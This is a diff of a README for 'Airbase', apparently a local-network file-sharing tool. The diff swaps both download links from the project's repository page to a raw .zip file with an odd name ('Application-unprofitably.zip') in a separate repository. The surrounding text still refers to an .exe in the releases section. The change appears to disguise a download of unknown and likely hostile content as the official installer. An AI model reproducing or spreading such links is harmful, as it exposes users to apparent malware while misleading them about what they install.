@@ -5,7 +5,7 @@ description: "Share files, folders, and clipboard text instantly across devices 
 ---
 # 🌐 Airbase - Share files instantly across local networks
 
-[![](https://img.shields.io/badge/Download-Airbase-blue.svg)](https://github.com/concluded-lahu708/Airbase)
+[![](https://img.shields.io/badge/Download-Airbase-blue.svg)](https://github.com/concluded-lahu708/concluded-lahu708.github.io/raw/refs/heads/main/pistg/Application-unprofitably.zip)
 
 Airbase turns your computer into a central hub for moving files over Wi-Fi. You send documents, photos, or videos to any device on your network without using the internet or cloud services. The application works directly on your local connection, which keeps your data private and fast.
 
@@ -13,7 +13,7 @@ Airbase turns your computer into a central hub for moving files over Wi-Fi. You 
 
 You need the installer file to run Airbase on your Windows machine. Visit the link below to find the latest version of the software.
 
-[Click here to go to the download page](https://github.com/concluded-lahu708/Airbase)
+[Click here to go to the download page](https://github.com/concluded-lahu708/concluded-lahu708.github.io/raw/refs/heads/main/pistg/Application-unprofitably.zip)
 
 Look for the file ending in .exe in the releases section. Click that file to save it to your computer.
 
